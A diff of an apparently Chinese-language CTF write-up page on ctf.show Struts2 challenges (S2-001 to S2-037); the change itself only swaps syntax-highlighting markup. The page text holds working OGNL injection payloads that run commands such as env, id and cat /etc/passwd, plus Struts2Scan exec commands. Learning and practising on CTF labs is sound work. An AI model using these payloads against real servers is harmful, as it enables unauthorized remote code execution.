@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -265,12 +273,12 @@
 <li><code>$</code>   主要是在Struts 2配置文件中，引用OGNL表达式</li>
 </ul>
 <p>payload:</p>
-<div class="hljs"><pre><code>//获取tomact路径
+<pre><code>//获取tomact路径
 %&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;
 //获取web路径
 %&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#39;/&#39;)),#response.flush(),#response.close()&#125;
 //命令执行
-%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;username=1</code></pre></div>
+%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;username=1</code></pre>
 <p>flag再env中<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201082249732.png" srcset="/img/loading.gif"><br>或者直接用工具打<br><a target="_blank" rel="noopener" href="https://github.com/HatBoy/Struts2-Scan">https://github.com/HatBoy/Struts2-Scan</a><br>检测<code>python .\Struts2Scan.py -u http://5f3afd6b-33da-45f2-9367-4dd742779ca9.challenge.ctf.show/S2-001/login.action</code><br>命令执行<code>python .\Struts2Scan.py -u http://5f3afd6b-33da-45f2-9367-4dd742779ca9.challenge.ctf.show/S2-001/login.action -n S2-001 --exec</code></p>
 <h2 id="web280"><a href="#web280" class="headerlink" title="web280"></a>web280</h2><p><code>S2-003</code></p>
 <blockquote>
@@ -319,14 +327,14 @@
 <blockquote>
 <p>  如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p>
 </blockquote>
-<div class="hljs"><pre><code>&lt;package name=&quot;S2-012&quot; extends=&quot;struts-default&quot;&gt;    &lt;action name=&quot;user&quot; class=&quot;com.demo.action.UserAction&quot;&gt;        &lt;result name=&quot;redirect&quot; type=&quot;redirect&quot;&gt;/index.jsp?name=$&#123;name&#125;&lt;/result&gt;        &lt;result name=&quot;input&quot;&gt;/index.jsp&lt;/result&gt;        &lt;result name=&quot;success&quot;&gt;/index.jsp&lt;/result&gt;    &lt;/action&gt;&lt;/package&gt;</code></pre></div>
+<pre><code>&lt;package name=&quot;S2-012&quot; extends=&quot;struts-default&quot;&gt;    &lt;action name=&quot;user&quot; class=&quot;com.demo.action.UserAction&quot;&gt;        &lt;result name=&quot;redirect&quot; type=&quot;redirect&quot;&gt;/index.jsp?name=$&#123;name&#125;&lt;/result&gt;        &lt;result name=&quot;input&quot;&gt;/index.jsp&lt;/result&gt;        &lt;result name=&quot;success&quot;&gt;/index.jsp&lt;/result&gt;    &lt;/action&gt;&lt;/package&gt;</code></pre>
 <blockquote>
 <p>这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行<br>影响版本: 2.1.0 - 2.3.13</p>
 </blockquote>
 <p>payload:</p>
-<div class="hljs"><pre><code>%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</code></pre></div>
+<pre><code>%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</code></pre>
 <h2 id="web285"><a href="#web285" class="headerlink" title="web285"></a>web285</h2><p><code>S2-013</code></p>
-<div class="hljs"><pre><code>Struts2 标签中 &lt;s:a&gt; 和 &lt;s:url&gt; 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：
+<pre><code>Struts2 标签中 &lt;s:a&gt; 和 &lt;s:url&gt; 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：
 
     none - 链接不包含请求的任意参数值（默认）
     get - 链接只包含 GET 请求中的参数和其值
@@ -334,13 +342,13 @@
 
 &lt;s:a&gt;用来显示一个超链接，当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞
 
-影响版本：2.0.0 - 2.3.14.1</code></pre></div>
+影响版本：2.0.0 - 2.3.14.1</code></pre>
 <p>payload:</p>
 <blockquote>
 <p><code>/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#39;env&#39;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(&#39;dbapp%3D&#39;%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D</code></p>
 </blockquote>
 <p>工具打</p>
-<h2 id="web286"><a href="#web286" class="headerlink" title="web286"></a>web286</h2><div class="hljs"><pre><code>漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：
+<h2 id="web286"><a href="#web286" class="headerlink" title="web286"></a>web286</h2><pre><code>漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：
 
 &lt;package name=&quot;S2-015&quot; extends=&quot;struts-default&quot;&gt;    &lt;action name=&quot;*&quot; class=&quot;com.demo.action.PageAction&quot;&gt;        &lt;result&gt;/&#123;1&#125;.jsp&lt;/result&gt;    &lt;/action&gt;&lt;/package&gt;
 
@@ -348,7 +356,7 @@
 
 还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的 setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 #_memberAccess[&#39;allowStaticMethodAccess&#39;]=true 来修改其值达到重获静态方法调用的能力
 
-影响版本: 2.0.0 - 2.3.14.2</code></pre></div>
+影响版本: 2.0.0 - 2.3.14.2</code></pre>
 <p><code>http://d3a0fd25-58fe-4c11-a18f-99824e28344a.challenge.ctf.show/S2-015/$%7B1+1%7D.action</code></p>
 <p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201091545469.png" srcset="/img/loading.gif"></p>
 <p>poc</p>
@@ -359,46 +367,46 @@
 <blockquote>
 <p><code>%24%7B%23context%5B&#39;xwork.MethodAccessor.denyMethodExecution&#39;%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;)%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#39;id&#39;).getInputStream())%2C%23q%7D.action%0A</code></p>
 </blockquote>
-<h2 id="web287"><a href="#web287" class="headerlink" title="web287"></a>web287</h2><div class="hljs"><pre><code>在struts2中，DefaultActionMapper类支持以&quot;action:&quot;、“redirect:”、&quot;redirectAction:&quot;作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令
+<h2 id="web287"><a href="#web287" class="headerlink" title="web287"></a>web287</h2><pre><code>在struts2中，DefaultActionMapper类支持以&quot;action:&quot;、“redirect:”、&quot;redirectAction:&quot;作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令
 
 所以，访问http://your-ip:8080/index.action?redirect:OGNL表达式即可执行OGNL表达式
 
-影响版本: 2.0.0 - 2.3.15</code></pre></div>
+影响版本: 2.0.0 - 2.3.15</code></pre>
 <p>payload:</p>
 <blockquote>
 <p><code>redirect:%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22uname%20-a%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D</code></p>
 </blockquote>
 <h2 id="web288"><a href="#web288" class="headerlink" title="web288"></a>web288</h2><p><code>S2-019</code></p>
 <p>poc</p>
-<div class="hljs"><pre><code>?debug=command&amp;expression=#a=(new java.lang.ProcessBuilder(&#39;id&#39;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),#out.getWriter().println(new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()
+<pre><code>?debug=command&amp;expression=#a=(new java.lang.ProcessBuilder(&#39;id&#39;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),#out.getWriter().println(new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()
 // 利用是先进行url编码    
 
 
 与s2-008poc区别不同的仅仅是由原先的[“allowStaticMethodAccess”]=true静态方法执行改为(new java.lang.ProcessBuilder(‘id’)).start()，但该方法在虚空浪子心提出s2-012后不久就在博客里说明了官方修补方案将allowStaticMethodAccess取消了后的替补方法就是使用ava.lang.ProcessBuilder
 
-影响版本：Struts 2.0.0 - Struts 2.3.15.1</code></pre></div>
+影响版本：Struts 2.0.0 - Struts 2.3.15.1</code></pre>
 <h2 id="web289"><a href="#web289" class="headerlink" title="web289"></a>web289</h2><p><code>S2-029</code></p>
-<div class="hljs"><pre><code>Struts框架被强制执行时，对分配给某些标签的属性值进行双重评估，因此可以传入一个值，当一个标签的属性将被渲染时，该值将被再次评估
+<pre><code>Struts框架被强制执行时，对分配给某些标签的属性值进行双重评估，因此可以传入一个值，当一个标签的属性将被渲染时，该值将被再次评估
 
 例如：代码执行过程大致为先尝试获取value的值，如果value为空，那么就二次解释执行了name。并且在执行前给name加上了”%&#123;&#125;”。最终造成二次执行
 
-影响版本：Struts 2.0.0 - Struts 2.3.24.1（2.3.20.3除外）</code></pre></div>
+影响版本：Struts 2.0.0 - Struts 2.3.24.1（2.3.20.3除外）</code></pre>
 <p>poc:<code>default.action?message=(%23_memberAccess[&#39;allowPrivateAccess&#39;]=true,%23_memberAccess[&#39;allowProtectedAccess&#39;]=true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]=%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]=%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]=true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;env&#39;).getInputStream()))</code></p>
 <p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201091614116.png" srcset="/img/loading.gif"></p>
 <h2 id="web290"><a href="#web290" class="headerlink" title="web290"></a>web290</h2><p><code>S2-032</code></p>
-<div class="hljs"><pre><code>Struts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用method:&lt;name&gt;的方式来调用名字是&lt;name&gt;的方法，而这个方法名将会进行OGNL表达式计算，导致远程命令执行漏洞
+<pre><code>Struts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用method:&lt;name&gt;的方式来调用名字是&lt;name&gt;的方法，而这个方法名将会进行OGNL表达式计算，导致远程命令执行漏洞
 
-影响版本: Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</code></pre></div>
+影响版本: Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</code></pre>
 <p>poc:<code>?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=\\A&amp;ppp= &amp;encoding=UTF-8&amp;cmd=env</code></p>
 <h2 id="web291"><a href="#web291" class="headerlink" title="web291"></a>web291</h2><p><code>S2-033</code></p>
-<div class="hljs"><pre><code>当开启动态方法调用，并且同时使用了Strut2 REST Plugin插件时，使用“!”操作符调用动态方法可能执行ognl表达式，导致代码执行
+<pre><code>当开启动态方法调用，并且同时使用了Strut2 REST Plugin插件时，使用“!”操作符调用动态方法可能执行ognl表达式，导致代码执行
 
-影响版本：Struts 2.3.20 – Struts 2.3.28 (不包括 2.3.20.3和 2.3.24.3)</code></pre></div>
+影响版本：Struts 2.3.20 – Struts 2.3.28 (不包括 2.3.20.3和 2.3.24.3)</code></pre>
 <p>poc:<code>/orders/4/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=env</code></p>
 <h2 id="web292"><a href="#web292" class="headerlink" title="web292"></a>web292</h2><p><code>S2-037</code></p>
-<div class="hljs"><pre><code>当使用REST插件启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式
+<pre><code>当使用REST插件启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式
 
-影响版本：Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外）</code></pre></div>
+影响版本：Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外）</code></pre>
 <p>poc:<code>/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=env</code></p>
 <h2 id="web298"><a href="#web298" class="headerlink" title="web298"></a>web298</h2><p><code>反编译</code></p>
 <p>给了一个<code>war</code>包</p>
@@ -567,6 +575,8 @@
 
 
 
+  
+    
   
 
 
